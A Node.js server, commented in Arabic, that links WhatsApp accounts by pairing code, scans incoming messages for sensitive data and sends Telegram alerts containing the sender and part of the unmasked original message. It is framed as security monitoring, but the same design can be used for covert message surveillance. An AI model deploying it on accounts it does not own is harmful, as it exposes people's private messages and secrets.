import express from 'express';
import { createServer } from 'http';
import { Server } from 'socket.io';
import { makeWASocket, useMultiFileAuthState, Browsers, fetchLatestBaileysVersion } from '@whiskeysockets/baileys';
import TelegramBot from 'node-telegram-bot-api';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import 'dotenv/config';  // ⬅️ تحميل متغيرات البيئة من ملف .env

const __dirname = path.dirname(fileURLToPath(import.meta.url));

// ========== تكوين Telegram من متغيرات البيئة ==========
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.error('❌ خطأ: تأكد من وجود TELEGRAM_BOT_TOKEN و TELEGRAM_CHAT_ID في ملف .env');
    process.exit(1);
}

const telegramBot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });
console.log('✅ تم تهيئة بوت تليجرام بنجاح');

// ========== استيراد scanner.js بأمان ==========
let scanMessageForSensitiveData = (text) => [];
try {
    const scanner = await import('./scanner.js');
    scanMessageForSensitiveData = scanner.scanMessageForSensitiveData || (() => []);
    console.log('✅ scanner.js تم تحميله بنجاح');
} catch (err) {
    console.error('❌ فشل تحميل scanner.js:', err.message);
}

// ========== إعداد الخادم ==========
const app = express();
const server = createServer(app);
const io = new Server(server, { cors: { origin: "*" }, transports: ['websocket', 'polling'] });

// ========== الحالة العالمية ==========
const activeSessions = new Map();
const sessionsData = new Map();

// 🚨 إرسال إشعار إلى Telegram
async function sendTelegramSecurityAlert(accountNumber, fromNumberOrName, originalMessage, detectedInfo) {
    try {
        const detectionDetails = detectedInfo.map(info => `⚠️ ${info.type}: ${info.maskedValue}`).join('\n');
        const text = `🚨 *تنبيه أمني - تم اكتشاف معلومات حساسة!* 🚨\n\n` +
                     `📱 *حساب واتساب المستلم:* ${accountNumber}\n` +
                     `👤 *المرسل:* ${fromNumberOrName || 'غير معروف'}\n` +
                     `⏰ *الوقت:* ${new Date().toLocaleString()}\n\n` +
                     `📝 *الرسالة الأصلية:*\n> ${originalMessage.substring(0, 200)}${originalMessage.length > 200 ? '...' : ''}\n\n` +
                     `🔍 *التفاصيل المكتشفة:*\n${detectionDetails}`;
        await telegramBot.sendMessage(TELEGRAM_CHAT_ID, text, { parse_mode: 'Markdown' });
        console.log(`✅ [${accountNumber}] تم إرسال تنبيه إلى تليجرام.`);
    } catch (err) {
        console.error(`❌ فشل إرسال إشعار تليجرام: ${err.message}`);
    }
}

// ========== منطق إنشاء جلسة واتساب (كما هو مع تحسينات) ==========
async function createWhatsAppSession(phoneNumber) {
    console.log(`جاري إنشاء جلسة للرقم: ${phoneNumber}`);
    const sessionDir = path.join(__dirname, `auth_sessions/${phoneNumber}`);
    if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir, { recursive: true });

    try {
        const { version } = await fetchLatestBaileysVersion();
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
        const sock = makeWASocket({
            version,
            auth: state,
            browser: Browsers.macOS('Chrome'),
            printQRInTerminal: false,
            defaultQueryTimeoutMs: 60000,
            keepAliveIntervalMs: 30000,
            generateHighQualityLinkPreview: false,
        });

        sock.ev.on('creds.update', saveCreds);
        let pairingRequested = false;

        sock.ev.on('connection.update', async (update) => {
            const connectionState = update.connection;
            console.log(`[${phoneNumber}] حالة الاتصال: ${connectionState}`);

            if (connectionState === 'open' && !state.creds.registered && !pairingRequested) {
                pairingRequested = true;
                try {
                    const code = await sock.requestPairingCode(phoneNumber);
                    io.emit('pairing_code', { code, phoneNumber });
                } catch (err) {
                    io.emit('error', `فشل طلب الرمز للرقم ${phoneNumber}`);
                }
            } else if (connectionState === 'close') {
                setTimeout(() => createWhatsAppSession(phoneNumber), 60000);
            }
        });

        sock.ev.on('messages.upsert', async ({ messages }) => {
            for (const msg of messages) {
                if (msg.message && !msg.key.fromMe) {
                    const messageText = msg.message.conversation || msg.message.extendedTextMessage?.text || '';
                    if (messageText && scanMessageForSensitiveData) {
                        const senderName = msg.pushName || msg.key.remoteJid;
                        const detected = scanMessageForSensitiveData(messageText);
                        if (detected && detected.length > 0) {
                            await sendTelegramSecurityAlert(phoneNumber, senderName, messageText, detected);
                        }
                    }
                }
            }
        });

        return sock;
    } catch (err) {
        console.error(`خطأ في جلسة ${phoneNumber}: ${err.message}`);
        throw err;
    }
}

// ========== واجهة المستخدم (HTML - نفس المحتوى السابق) ==========
const HTML_PAGE = `<!DOCTYPE html>...`; // (ضع نفس محتوى HTML السابق هنا)

app.get('/', (req, res) => res.send(HTML_PAGE));
app.get('/health', (req, res) => res.status(200).send('OK'));

// ========== أحداث Socket.IO ==========
io.on('connection', (socket) => {
    console.log('🟢 عميل متصل:', socket.id);
    
    socket.on('add_account', async ({ phone }) => {
        const cleanPhone = phone.replace(/\D/g, '');
        if (activeSessions.has(cleanPhone)) {
            socket.emit('error', `الحساب ${cleanPhone} موجود مسبقًا`);
            return;
        }
        try {
            const sock = await createWhatsAppSession(cleanPhone);
            activeSessions.set(cleanPhone, { sock, status: 'مراقب' });
            sessionsData.set(cleanPhone, { phone: cleanPhone, status: 'مراقب', date: new Date().toLocaleString() });
            io.emit('accounts_list', Array.from(sessionsData.values()));
        } catch (err) {
            socket.emit('error', `فشل ربط الحساب ${cleanPhone}: ${err.message}`);
        }
    });
    
    socket.on('request_accounts', () => {
        socket.emit('accounts_list', Array.from(sessionsData.values()));
    });
});

// معالجة الاستثناءات غير المتوقعة
process.on('uncaughtException', (err) => console.error('❌ خطأ غير متوقع:', err));
process.on('unhandledRejection', (err) => console.error('❌ رفض وعد غير معالج:', err));

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`🚀 النظام يعمل على http://localhost:${PORT}`));
